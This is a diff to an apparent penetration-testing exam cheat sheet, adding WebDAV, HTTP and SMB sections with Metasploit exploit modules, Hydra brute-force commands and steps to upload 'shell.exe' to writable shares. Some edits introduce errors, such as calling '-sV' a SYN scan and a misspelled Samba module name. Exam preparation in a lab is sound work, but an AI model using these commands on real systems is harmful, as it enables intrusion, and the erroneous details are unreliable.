@@ -8,7 +8,7 @@ This section provides a high-level OODA loop to guide the entire 48-hour examina
 - Observe (Observe the battlefield) — first 30 minutes
   - Read all 35 questions
   - Read and comprehend the core table (minimum pass mark)
-  - Read and internalize the examination constraints (no internet access, dynamic flags)
+  - Read and internalize the examination constraints (no internet access, dynamic Flags)
 
 - Orient (Adjust mindset) — most critical strategic step
   - The exam is not a "pwn-all-machines" CTF. It is a "document-all-findings" audit.
@@ -26,8 +26,8 @@ This section provides a high-level OODA loop to guide the entire 48-hour examina
 | ----------------------------- | ------ | ----------------------------------------------------------------------------------------------------------------------------- | ------------- |
 | Assessment Methodologies      | 25%    | Host discovery (`nmap -sn`), port/service/OS identification (`nmap -sV -sC -O`), vulnerability identification (`searchsploit`) | 90%           |
 | Host & Network Auditing       | 25%    | System/user enumeration, credential dumping, file transfer                                                                    | 80%           |
-| Host & Network Penetration    | 35%    | Exploitation (Metasploit Framework), brute force (Hydra), pivoting                                                            | 70%           |
-| Web Application               | 15%    | Directory enumeration (Gobuster), CMS scanning (WPScan), SQL injection, cross-site scripting                                  | 60%           |
+| Host & Network Penetration    | 35%    | Exploitation (Metasploit Framework), brute force (hydra), pivoting                                                            | 70%           |
+| Web Application               | 15%    | Directory enumeration (gobuster), CMS scanning (wpscan), SQL injection, cross-site scripting                                  | 60%           |
 
 # Tactical Deployment and Reconnaissance
 
@@ -37,8 +37,6 @@ The Metasploit database serves as the core strategic tool for managing operation
 
 ```bash
 service postgresql start && msfconsole
-```
-```text
 msf6 > db_status
 msf6 > workspace -a lab
 ```
@@ -72,12 +70,12 @@ msf6 > setg RHOST <target_ip>
 
 ### Issue 1
 
-- Orient (Positioning issue): `nmap -sn` scan shows zero hosts, or `nmap -sS` scan indicates all ports are "filtered".
+- Orient (Positioning issue): `nmap -sn` scan shows zero hosts, or `nmap -sV` scan indicates all ports are "filtered".
 - Decide (Determine Diagnostic Action):
-  1. Re-Orient (Tool Failure): `nmap -sn` (ICMP ping) is frequently blocked by firewalls. `nmap -sS` (SYN scan) may also be blocked.
+  1. Re-Orient (Tool Failure): `nmap -sn` (ICMP Ping) is frequently blocked by firewalls. `nmap -sV` (default SYN scan) may also be blocked.
   2. Re-Decide (Switch Tools)
 - Act:
-  1. Use `sudo arp-scan -I eth0 <target_ip_range>`. ARP operates at Layer 2 and is virtually unfiltered on the local subnet. This is the most reliable host discovery method.
+  1. Use `sudo arp-scan -I eth0 <RANGE>`. ARP operates at Layer 2 and is virtually unfiltered on the local subnet. This is the most reliable host discovery method.
   2. For port scanning, switch to a full TCP Connect scan: `nmap -sT -Pn <target_ip>`. `-sT` is noisier but more reliable against simple firewalls. `-Pn` skips (potentially failing) host discovery pings.
 - Re-Orient (Self-Check): Is your own machine configured correctly? Check `ip a` on Kali. Are you on the correct VPN interface (`tun0`)? Are you scanning the correct subnet?
 
@@ -172,9 +170,122 @@ wpscan --url http://<target_ip> --enumerate u,p,t,vp
 ```
 
 - Options reference:
-  - `--url <url>`: Target URL
+  - `--url <URL>`: Target URL
   - `--enumerate p`: Enumerate popular plugins
   - `--enumerate ap`: Enumerate all plugins (takes considerable time)
   - `--enumerate t`: Enumerate popular themes
   - `--enumerate at`: Enumerate all themes
   - `--enumerate vp`: Enumerate vulnerable plugins (most commonly used)
+
+### WebDAV Enumeration
+
+```bash
+davtest -url http://<target_ip>/webdav
+```
+
+### MSF Enumeration
+
+```text
+msf6 > use auxiliary/scanner/http/dir scanner
+msf6 > use auxiliary/scanner/http/http_put
+```
+
+### Exploitation
+
+- If `auxiliary/scanner/http/http_put` reports "PUT is allowed"
+    ```text
+    msf6 > use exploit/windows/iis/iis_webdav_upload_asp
+    ```
+
+- If Banner = "HTTP File Server 2.3x" 
+    ```text
+    msf6 > use exploit/windows/http/rejetto_hfs_exec
+    ```
+
+- If Banner = "BadBlue 2.72b"
+    ```text
+    msf6 > use exploit/windows/http/badblue_passthru
+    ```
+
+- If obtain Tomcat Management Credentials
+    ```text
+    msf6 > use exploit/multi/http/tomcat_jsp_upload_bypass 
+    ```
+
+- If find Local File Inclusion and Remote File Inclusion
+    Switch to the LFI/RFI & Web Attack Payloads Quick Reference Guide
+
+### Brute Force
+
+```bash
+hydra -l admin -P rockyou.txt <TARGET_IP> http-post-form \"/login.php:username=^USER^&password=^PASS^:F=<failed_message>"
+```
+
+- Parameter Description
+    - `username` and `password` is the value name defined by web application, and they can be various in different website, e.g. some sites use `user` and `password`.
+    -  `^USER^` and `^PASS^`: Hydra placeholders.
+    - `F=<failed_message>`: `F=` specifies the distinctive string returned on the page following a failed login.
+
+## Port 139/445: SMB
+
+### Scan
+
+```bash
+nmap -p 139,445 --script=smb-enum-shares,smb-enum-users,smb-protocols <target_ip>
+```
+
+### Automatic Enumeration
+
+```bash
+enum4linux -a <target_ip>
+```
+
+- Options reference:
+    - `-a`: Run all enumerations (legacy).
+    - `-U`: Enumerate users.
+    - `-S`: Enumerate shares.
+    - `-G`: Enumerate groups and members.
+    - `-r`: RID cycling (used to find users).
+
+### Manual Enumeration
+
+```bash
+smbmap -H <target_ip>: (Empty session) List shares and permissions.
+smbmap -H <target_ip> -u <user> -p <pass>: List shares and permissions using credentials。
+smbmap -H <target_ip> -r <share>: Recursively list shared memory
+```
+
+### Exploitation
+
+- If smb enumshares detects anonymous writable shares (ANON WRITE) 
+
+    ```bash
+    smbclient //<target_ip>/<ShareName> -N
+    put shell.exe
+    ```
+
+- If Banner = "Samba 3.5.0-4.6.4" and have a writable share
+
+    ```text
+    msf6 > use exploit/linux/samba/is_knwon_pipename
+    ```
+
+- If brute force attack succeed (admin user only)
+
+    ```text
+    msf6 > use exploit/windows/smb/psexec
+    ```
+
+- If brute force attack succeed (but not admin user)
+
+    ```bash
+    smbclient //<target_ip>/<ShareName> -U 'username%password'
+    put shell.exe
+    ```
+
+### Brute Force
+
+```bash
+hydra -L <user_file> -P <password_file> //<target_ip> smb
+```
+
